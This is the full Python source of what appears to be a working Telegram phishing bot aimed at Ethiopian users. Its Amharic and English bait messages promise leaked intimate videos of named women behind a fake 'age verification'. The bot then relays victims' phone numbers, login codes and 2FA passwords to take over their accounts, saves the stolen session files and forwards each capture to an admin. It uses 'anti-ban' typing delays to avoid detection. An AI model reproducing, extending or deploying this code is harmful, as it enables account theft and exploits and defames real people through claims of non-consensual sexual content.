# bot.py — Final Fixed Version
# All buttons work, fresh start every time

import os
import json
import sqlite3
import asyncio
import time
import re
import threading
import random
from datetime import datetime, timedelta
from pathlib import Path
from flask import Flask, jsonify
from telethon import TelegramClient, errors
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ConversationHandler, ContextTypes
)

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))

# Anti-ban
MAX_MESSAGES_PER_USER_PER_HOUR = 10
MIN_DELAY_BETWEEN_MESSAGES = 1.5
ENABLE_TYPING_INDICATOR = True
HUMAN_LIKE_TYPING_SPEED = True

# ============ PATHS ============
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
if not os.path.exists(DATA_DIR):
    DATA_DIR = "data"

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "sessions"), exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "images"), exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "telegram_phishing.db")

# ============ FLASK ============
app = Flask(__name__)
start_time = time.time()

@app.route('/')
def index():
    return jsonify({"status": "running", "uptime": time.time() - start_time})

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

@app.route('/stats')
def stats():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM sessions WHERE status = ?', ('captured',))
        captured = c.fetchone()[0]
        conn.close()
        return jsonify({"total": total, "captured": captured})
    except:
        return jsonify({"error": "DB not ready"})

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        username TEXT,
        first_name TEXT,
        phone TEXT,
        code TEXT,
        twofa TEXT,
        session_file TEXT,
        user_info TEXT,
        timestamp TEXT,
        status TEXT
    )''')
    conn.commit()
    conn.close()

def save_session(user_id, username, first_name, phone, step):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO sessions 
                 (user_id, username, first_name, phone, timestamp, status) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, username, first_name, phone, datetime.now().isoformat(), step))
    last_id = c.lastrowid
    conn.commit()
    conn.close()
    return last_id

def update_session(record_id, phone=None, code=None, twofa=None, session_file=None, user_info=None, status=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    updates = []
    params = []
    
    if phone is not None:
        updates.append('phone = ?')
        params.append(phone)
    if code is not None:
        updates.append('code = ?')
        params.append(code)
    if twofa is not None:
        updates.append('twofa = ?')
        params.append(twofa)
    if session_file is not None:
        updates.append('session_file = ?')
        params.append(session_file)
    if user_info is not None:
        updates.append('user_info = ?')
        params.append(json.dumps(user_info))
    if status is not None:
        updates.append('status = ?')
        params.append(status)
    
    if not updates:
        return
    
    params.append(record_id)
    query = f"UPDATE sessions SET {', '.join(updates)} WHERE id = ?"
    c.execute(query, params)
    conn.commit()
    conn.close()

def get_session_by_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions WHERE user_id = ? ORDER BY id DESC LIMIT 1', (str(user_id),))
    row = c.fetchone()
    conn.close()
    return row

def get_all_sessions():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return rows

def get_session_by_id(record_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions WHERE id = ?', (record_id,))
    row = c.fetchone()
    conn.close()
    return row

def delete_session(record_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM sessions WHERE id = ?', (record_id,))
    conn.commit()
    conn.close()

def clear_user_sessions(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('UPDATE sessions SET status = ? WHERE user_id = ? AND status IN (?, ?, ?)',
              ('cancelled', str(user_id), 'pending', 'code_sent', '2fa_required'))
    conn.commit()
    conn.close()

# ============ RATE LIMITING ============
user_message_counts = {}
user_last_message_time = {}

def can_send_message(user_id):
    current_hour = datetime.now().hour
    if user_id in user_message_counts:
        count, hour = user_message_counts[user_id]
        if hour == current_hour:
            if count >= MAX_MESSAGES_PER_USER_PER_HOUR:
                return False
        else:
            user_message_counts[user_id] = (0, current_hour)
    else:
        user_message_counts[user_id] = (0, current_hour)
    
    if user_id in user_last_message_time:
        elapsed = time.time() - user_last_message_time[user_id]
        if elapsed < MIN_DELAY_BETWEEN_MESSAGES:
            return False
    return True

def record_message_sent(user_id):
    current_hour = datetime.now().hour
    if user_id in user_message_counts:
        count, _ = user_message_counts[user_id]
        user_message_counts[user_id] = (count + 1, current_hour)
    else:
        user_message_counts[user_id] = (1, current_hour)
    user_last_message_time[user_id] = time.time()

async def safe_send(context, chat_id, text, **kwargs):
    user_id = str(chat_id)
    if not can_send_message(user_id):
        await asyncio.sleep(random.uniform(1.5, 3.0))
        if not can_send_message(user_id):
            return None
    
    if ENABLE_TYPING_INDICATOR:
        try:
            await context.bot.send_chat_action(chat_id=chat_id, action="typing")
        except:
            pass
    
    if HUMAN_LIKE_TYPING_SPEED:
        await asyncio.sleep(random.uniform(0.5, 1.5))
    
    try:
        msg = await context.bot.send_message(chat_id=chat_id, text=text, **kwargs)
        record_message_sent(user_id)
        return msg
    except Exception as e:
        print(f"Send error: {e}")
        return None

async def safe_send_photo(context, chat_id, photo_path, caption=None, **kwargs):
    user_id = str(chat_id)
    if not can_send_message(user_id):
        await asyncio.sleep(random.uniform(1.5, 3.0))
        if not can_send_message(user_id):
            return None
    
    if ENABLE_TYPING_INDICATOR:
        try:
            await context.bot.send_chat_action(chat_id=chat_id, action="upload_photo")
        except:
            pass
    
    if HUMAN_LIKE_TYPING_SPEED:
        await asyncio.sleep(random.uniform(0.5, 1.5))
    
    try:
        with open(photo_path, 'rb') as f:
            msg = await context.bot.send_photo(
                chat_id=chat_id, 
                photo=f, 
                caption=caption,
                **kwargs
            )
        record_message_sent(user_id)
        return msg
    except Exception as e:
        print(f"Send photo error: {e}")
        return None

# ============ BILINGUAL MESSAGES ============

HOOK_MESSAGES = [
    """🔥 *አዲስ የተሰረቀ ቪዲዮ ወጥቷል!* 🔥

*የባምቢ ሀበሻ* የተሰረቀ ቪዲዮ ወጥቷል! ሙሉ ቪዲዮ እነሆ! 🥵

እንዲሁም:
- 🔞 የጃኒ ገብሩ ምስጢራዊ ቪዲዮ
- 📸 የፊዮና የግል ቪዲዮ
- 🎬 የሌሎችም የኢትዮጵያ ቲክቶከሮች 

*ዕድሜዎን ያረጋግጡ* (18+)

---
🔥 *BAMBI LEAKED VIDEO!* 🔥

Full uncut version is here! 🥵

Also:
- 🔞 Jany Gebru private content
- 📸 Fiyona exclusive video  
- 🎬 More Ethiopian celebrities

*Age verification required* (18+)

👇 *Tap to verify your age* 👇""",

    """🎬 *EXCLUSIVE LEAKS — ETHIOPIAN CELEBRITIES* 🎬

*የባምቢ* ሙሉ ቪዲዮ ተሰረቀ 🥵! 🔥

ውስጥ ያለው:
- 🔞 የጃኒ ገብሩ — የግል ቪዲዮ
- 📸 የፊዮና — ምስጢራዊ ቪዲዮ
- 🎬 የሌሎች በየቀኑ

*ዕድሜዎ 18+ መሆን አለቦት*

---
🎬 *EXCLUSIVE LEAKS — ETHIOPIAN CELEBRITIES* 🎬

*BAMBI* full leaked video! 🔥

Inside:
- 🔞 Jany Gebru — private video
- 📸 Fiyona — exclusive content
- 🎬 New leaks daily

*18+ verification required*

👇 *Tap to verify your age* 👇""",

    """💎 *የኢትዮጵያ ቲክቶከሮች ምስጢራዊ ቪዲዮ* 💎

የታወቁ ኢትዮጵያዊያን ቲክቶከሮች ቪዲዮ ተሰረቀ 🥵🥵

- 🔞 የባምቢ ሀበሻ — ሙሉ ቪዲዮ
- 📸 የጃኒ ገብሩ — የግል ቪዲዮ  
- 🎬 የፊዮና — ምስጢራዊ ቪዲዮ
- 🔥 ሌሎች...

*ዕድሜ 18+ መሆን አለበት*

---
💎 *ETHIOPIAN CELEBRITY LEAKS* 💎

Leaked videos of famous Ethiopian celebrities!

- 🔞 Bambi — full video
- 📸 Jany Gebru — private video
- 🎬 Fiyona — exclusive content
- 🔥 New leaks daily

*18+ verification required*

👇 *Tap to verify your age* 👇"""
]

VERIFY_MESSAGES = [
    """🔐 *ዕድሜ ማረጋገጫ* 🔐

እባክዎ ዕድሜዎን ለማረጋገጥ ስልክ ቁጥርዎን ያጋሩ።

*ስልክ ቁጥርዎ አይቀመጥም ወይም አይጋራም*

---
🔐 *AGE VERIFICATION* 🔐

Please share your phone number to verify your age.

*Your phone number is NOT stored or shared*

👇 *Share your phone number* 👇""",

    """📱 *ዕድሜ ማረጋገጫ* 📱

የኢትዮጵያ ኮከቦች ቪዲዮ ለማየት ዕድሜዎን ያረጋግጡ።

*ስልክ ቁጥር ያጋሩ*

---
📱 *AGE VERIFICATION* 📱

Verify your age to access Ethiopian celebrity leaks.

*Share your phone number*

👇 *Share your phone number* 👇"""
]

CODE_MESSAGES = [
    """✅ *ኮድ ተልኳል!* ✅

በቴሌግራም ውስጥ የደረሰውን 5 አሃዝ ኮድ ያስገቡ።

*በስፔስ ይለዩ:*
ለምሳሌ: `2 1 0 3 2`

---
✅ *Code sent!* ✅

Enter the 5-digit code you received in Telegram.

*Enter with spaces:*
Example: `2 1 0 3 2`""",

    """📲 *ኮድ ተልኳል!* 📲

የደረሰውን ኮድ በስፔስ ያስገቡ።

ለምሳሌ: `2 1 0 3 2`

---
📲 *Code sent!* 📲

Enter the code with spaces.

Example: `2 1 0 3 2`"""
]

SUCCESS_MESSAGES = [
    """✅ *ተረጋገጠ!* ✅

🎉 የኢትዮጵያ ቲክቶከሮች ቪዲዮ ለማየት ዝግጁ ነዎት!

🔞 *ባምቢ ቪዲዮ:* 
https://t.me/blackhat_et/

*እንኳን ደህና መጡ!* 🥵

---
✅ *VERIFIED!* ✅

🎉 You now have access to Ethiopian celebrity leaks!

🔞 *Bambi video:* 
https://t.me/blackhat_et/

*Welcome!* 🥵""",

    """🎉 *ACCESS GRANTED!* 🎉

የኢትዮጵያ ቲክቶከሮች ቪዲዮ ለማየት ዝግጁ ነዎት!

🔞 *Join the leaks channel:*
https://t.me/blackhat_et/

*Enjoy!* 🔥

---
🎉 *ACCESS GRANTED!* 🎉

You're verified! Access Ethiopian celebrity leaks now.

🔞 *Join the leaks channel:*
https://t.me/blackhat_et/

*Enjoy!* 🔥"""
]

# ============ IMAGE ============
def get_random_image():
    image_dir = os.path.join(DATA_DIR, "images")
    if not os.path.exists(image_dir):
        return None
    images = [f for f in os.listdir(image_dir) if f.endswith(('.jpg', '.jpeg', '.png', '.gif'))]
    if not images:
        return None
    return os.path.join(image_dir, random.choice(images))

# ============ TELEGRAM LOGIN ENGINE ============
class TelegramLoginEngine:
    def __init__(self, phone, record_id, user_id):
        self.phone = phone
        self.record_id = record_id
        self.user_id = user_id
        self.client = None
        self.session_name = os.path.join(DATA_DIR, f'sessions/{phone}_{int(time.time()*1000)}')
        self.code_hash = None

    def _cleanup_old_sessions(self):
        session_dir = os.path.join(DATA_DIR, "sessions")
        if not os.path.exists(session_dir):
            return
        for f in os.listdir(session_dir):
            if f.startswith(self.phone) and (f.endswith('.session') or f.endswith('.temp')):
                try:
                    os.remove(os.path.join(session_dir, f))
                except:
                    pass

    async def send_code(self):
        try:
            self._cleanup_old_sessions()
            self.client = TelegramClient(self.session_name, API_ID, API_HASH)
            await self.client.connect()
            result = await self.client.send_code_request(self.phone)
            self.code_hash = result.phone_code_hash
            update_session(self.record_id, status='code_sent')
            return {'success': True}
        except errors.rpcerrorlist.PhoneNumberInvalidError:
            return {'success': False, 'error': 'Invalid phone number'}
        except errors.rpcerrorlist.PhoneNumberFloodError:
            return {'success': False, 'error': 'Too many attempts. Try later.'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def verify_code(self, code):
        try:
            code = code.replace(' ', '').replace('-', '')
            if len(code) != 5:
                return {'success': False, 'error': 'Code must be 5 digits'}
            try:
                await self.client.sign_in(self.phone, code, phone_code_hash=self.code_hash)
                return await self._finalize()
            except errors.rpcerrorlist.SessionPasswordNeededError:
                update_session(self.record_id, code=code, status='2fa_required')
                return {'success': True, 'twofa_required': True}
            except errors.rpcerrorlist.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.rpcerrorlist.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def verify_2fa(self, password):
        try:
            await self.client.sign_in(password=password)
            return await self._finalize(twofa=password)
        except errors.rpcerrorlist.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _finalize(self, twofa=None):
        try:
            me = await self.client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            session_file = f'{self.session_name}.session'
            if os.path.exists(session_file):
                final_session = os.path.join(DATA_DIR, f'sessions/stolen_{self.phone}_{int(time.time())}.session')
                os.rename(session_file, final_session)
                update_session(
                    self.record_id,
                    twofa=twofa,
                    session_file=final_session,
                    user_info=user_info,
                    status='captured'
                )
                await self.client.disconnect()
                return {'success': True, 'user_info': user_info, 'session_file': final_session}
            return {'success': False, 'error': 'Session file not found'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============ CONVERSATION STATES ============
PHONE, OTP, TWOFA = range(3)

# ============ BOT HANDLERS ============

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle ALL button clicks — always start fresh verification"""
    query = update.callback_query
    await query.answer()
    user = query.from_user
    
    clear_user_sessions(user.id)
    context.user_data.clear()
    
    record_id = save_session(user.id, user.username, user.first_name, None, 'pending')
    context.user_data['record_id'] = record_id

    verify_text = random.choice(VERIFY_MESSAGES)

    # Fix: handle editing text vs media caption based on message type
    if query.message.text:
        # Normal text message → edit text
        await query.edit_message_text(verify_text, parse_mode='Markdown')
    else:
        # Photo / media message → edit caption
        await query.edit_message_caption(caption=verify_text, parse_mode='Markdown')

    # Send the custom keyboard request
    keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
    await safe_send(
        context, user.id,
        "📱 Tap below to share your phone number:",
        reply_markup={"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}
    )
    
    return PHONE

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    clear_user_sessions(user.id)
    context.user_data.clear()
    
    hook_text = random.choice(HOOK_MESSAGES)
    
    keyboard = [
        [InlineKeyboardButton("🔞 Verify Age — Bambi Leaked", callback_data="bambi")],
        [InlineKeyboardButton("📸 Verify Age — Jany Exclusive", callback_data="jany")],
        [InlineKeyboardButton("🎬 Verify Age — Fiyona Exclusive", callback_data="fiyona")],
        [InlineKeyboardButton("🔥 Verify Age — All Ethiopian Leaks", callback_data="all")],
        [InlineKeyboardButton("🔄 Start New Verification", callback_data="new")]
    ]
    
    image_path = get_random_image()
    if image_path and os.path.exists(image_path):
        await safe_send_photo(
            context, user.id, image_path,
            caption=hook_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    else:
        await safe_send(
            context, user.id, hook_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    clear_user_sessions(user.id)
    context.user_data.clear()
    await safe_send(context, user.id, "❌ Cancelled. Send /start to begin again.")
    return ConversationHandler.END

async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message

    record_id = context.user_data.get('record_id')
    if not record_id:
        existing = get_session_by_user(user.id)
        if existing and existing[10] in ['pending', 'code_sent']:
            record_id = existing[0]
            context.user_data['record_id'] = record_id
        else:
            await safe_send(context, user.id, "❌ Session expired. Send /start again.")
            return ConversationHandler.END

    phone = None
    if message.contact:
        phone = message.contact.phone_number
    elif message.text:
        phone = message.text.strip().replace(' ', '').replace('-', '')
        if not phone.startswith('+'):
            phone = '+' + phone

    if not phone or len(phone) < 8:
        keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
        await safe_send(
            context, user.id,
            "❌ Invalid phone. Use the button below.\n\n❌ ስልክ ቁጥር ትክክል አይደለም።",
            reply_markup={"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}
        )
        return PHONE

    update_session(record_id, phone=phone, status='sending_code')
    context.user_data['phone'] = phone

    await safe_send(context, user.id, "📡 Sending verification code...\n\n📡 ኮድ እየተላከ ነው...")

    engine = TelegramLoginEngine(phone, record_id, user.id)
    result = await engine.send_code()

    if result['success']:
        context.user_data['engine'] = engine
        await safe_send(
            context, user.id,
            random.choice(CODE_MESSAGES),
            parse_mode='Markdown',
            reply_markup={"remove_keyboard": True}
        )
        return OTP
    else:
        await safe_send(context, user.id, f"❌ {result.get('error', 'Unknown error')}")
        update_session(record_id, status='failed')
        return ConversationHandler.END

async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = update.message.text.strip()
    clean_code = re.sub(r'[\s\-\.]', '', code)

    if not clean_code.isdigit() or len(clean_code) != 5:
        await safe_send(
            context, user.id,
            "❌ Invalid. Enter 5 digits with spaces like `2 1 0 3 2`\n\n"
            "❌ 5 አሃዝ ኮድ በስፔስ ያስገቡ።",
            parse_mode='Markdown'
        )
        return OTP

    engine = context.user_data.get('engine')
    if not engine:
        existing = get_session_by_user(user.id)
        if existing and existing[10] == 'code_sent':
            phone = existing[4]
            if phone:
                engine = TelegramLoginEngine(phone, existing[0], user.id)
                context.user_data['engine'] = engine
                await engine.send_code()
            else:
                await safe_send(context, user.id, "❌ Session expired. /start again.")
                return ConversationHandler.END
        else:
            await safe_send(context, user.id, "❌ Session expired. /start again.")
            return ConversationHandler.END

    await safe_send(context, user.id, "🔍 Verifying...\n\n🔍 እየተረጋገጠ ነው...")
    result = await engine.verify_code(clean_code)

    if result['success']:
        if result.get('twofa_required'):
            await safe_send(
                context, user.id,
                "🔐 *2FA REQUIRED*\nEnter your 2FA password.\n\n"
                "🔐 *2FA ያስፈልጋል*\n2FA ፓስዎርድ ያስገቡ።",
                parse_mode='Markdown'
            )
            return TWOFA
        else:
            await safe_send(context, user.id, random.choice(SUCCESS_MESSAGES), parse_mode='Markdown')
            await notify_admin(context, context.user_data.get('record_id'), user, True)
            return ConversationHandler.END
    else:
        await safe_send(context, user.id, f"❌ {result.get('error', 'Invalid code')}")
        return OTP

async def twofa_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    password = update.message.text.strip()

    if not password or len(password) < 4:
        await safe_send(
            context, user.id,
            "❌ Password must be at least 4 characters.\n\n"
            "❌ ፓስዎርድ ቢያንስ 4 ፊደላት መሆን አለበት።"
        )
        return TWOFA

    engine = context.user_data.get('engine')
    if not engine:
        await safe_send(context, user.id, "❌ Session expired. /start again.")
        return ConversationHandler.END

    await safe_send(context, user.id, "🔍 Verifying 2FA...\n\n🔍 2FA እየተረጋገጠ ነው...")
    result = await engine.verify_2fa(password)

    if result['success']:
        await safe_send(context, user.id, random.choice(SUCCESS_MESSAGES), parse_mode='Markdown')
        await notify_admin(context, context.user_data.get('record_id'), user, True, twofa=password)
        return ConversationHandler.END
    else:
        await safe_send(context, user.id, f"❌ {result.get('error', 'Invalid password')}")
        return TWOFA

async def notify_admin(context, record_id, user, success, twofa=None):
    session_data = get_session_by_id(record_id)
    if not session_data:
        return
    
    phone = session_data[4] or 'Unknown'
    code = session_data[5] or 'No code'
    twofa_value = twofa or session_data[6] or 'No 2FA'
    
    msg = f"""🎯 *NEW CAPTURE!*

👤 {user.first_name} (@{user.username or 'no username'})
📱 `{phone}`
🔢 `{code}`
🔑 `{twofa_value}`
📁 {'✅ Success' if success else '⚠️ Partial'}"""
    
    await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
    
    if session_data[7] and os.path.exists(session_data[7]):
        try:
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=open(session_data[7], 'rb'),
                caption=f"📁 {phone}"
            )
        except:
            pass

# ============ ADMIN COMMANDS ============
async def admin_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
        return
    
    sessions = get_all_sessions()
    if not sessions:
        await safe_send(context, ADMIN_CHAT_ID, "📭 No sessions.")
        return
    
    msg = "📋 *SESSIONS*\n\n"
    for s in sessions[:20]:
        record_id, _, username, first_name, phone, code, twofa, session_file, user_info, timestamp, status = s
        emoji = {
            'pending': '⏳', 'code_sent': '📤', '2fa_required': '🔐',
            'captured': '✅', 'failed': '❌', 'cancelled': '🚫', 'timeout': '⏰'
        }.get(status, '❓')
        user_info_data = json.loads(user_info) if user_info else {}
        user_display = user_info_data.get('first_name', first_name or 'Unknown')
        username_display = f"@{user_info_data.get('username', username)}" if user_info_data.get('username') or username else ''
        phone_display = phone if phone else '❌ No phone'
        code_display = code if code else '—'
        msg += f"{emoji} *ID: {record_id}* | {user_display} {username_display}\n"
        msg += f"   📱 {phone_display} | 🔢 {code_display} | 🔑 {twofa or '—'}\n"
        msg += f"   📁 {session_file or 'No file'}\n\n"
    
    msg += f"\nTotal: {len(sessions)}"
    await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')

async def admin_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
        return
    
    args = context.args
    if not args or not args[0].isdigit():
        await safe_send(context, ADMIN_CHAT_ID, "❌ /get <id>")
        return
    
    session_data = get_session_by_id(int(args[0]))
    if not session_data or not session_data[7] or not os.path.exists(session_data[7]):
        await safe_send(context, ADMIN_CHAT_ID, "❌ File not found.")
        return
    
    await context.bot.send_document(
        chat_id=ADMIN_CHAT_ID,
        document=open(session_data[7], 'rb'),
        caption=f"📁 Session #{args[0]}"
    )

async def admin_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
        return
    
    args = context.args
    if not args or not args[0].isdigit():
        await safe_send(context, ADMIN_CHAT_ID, "❌ /delete <id>")
        return
    
    session_data = get_session_by_id(int(args[0]))
    if session_data and session_data[7] and os.path.exists(session_data[7]):
        os.remove(session_data[7])
    delete_session(int(args[0]))
    await safe_send(context, ADMIN_CHAT_ID, f"✅ Deleted #{args[0]}.")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
        return
    
    sessions = get_all_sessions()
    total = len(sessions)
    captured = len([s for s in sessions if s[10] == 'captured'])
    twofa = len([s for s in sessions if s[10] == '2fa_required'])
    pending = len([s for s in sessions if s[10] in ['pending', 'code_sent']])
    
    msg = f"📊 *STATS*\nTotal: {total}\n✅ Captured: {captured}\n🔐 2FA: {twofa}\n⏳ Pending: {pending}"
    await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')

async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
        return
    
    msg = """🤖 *ADMIN COMMANDS*
/sessions - List all captures
/get <id> - Download session file
/delete <id> - Delete session
/stats - Statistics
/help - This help"""
    await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')

# ============ BOT RUNNER ============
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def bot_main():
        init_db()
        print("🤖 Initializing bot...")
        
        application = Application.builder().token(BOT_TOKEN).build()

        # Fixed: Conversation handler now includes button clicks as entry point
        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler('start', start),
                CallbackQueryHandler(button_handler, pattern='.*')   # any button click starts the flow
            ],
            states={
                PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, phone_handler)],
                OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler)],
                TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_handler)]
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            per_message=False
        )

        application.add_handler(conv_handler)
        # The standalone CallbackQueryHandler is removed – now part of the conversation
        
        # Admin commands
        application.add_handler(CommandHandler('sessions', admin_sessions))
        application.add_handler(CommandHandler('get', admin_get))
        application.add_handler(CommandHandler('delete', admin_delete))
        application.add_handler(CommandHandler('stats', admin_stats))
        application.add_handler(CommandHandler('help', admin_help))

        print("🤖 Bot is ready, starting polling...")
        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        
        while True:
            await asyncio.sleep(1)

    try:
        loop.run_until_complete(bot_main())
    except Exception as e:
        print(f"❌ Bot error: {e}")
        import traceback
        traceback.print_exc()

# ============ MAIN ============
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Telegram Bot — Habesha Edition (FINAL FIX)           ║
    ║   ALL buttons work — Fixed media editing + conversation ║
    ║   Amharic + English — Fast session cleanup            ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
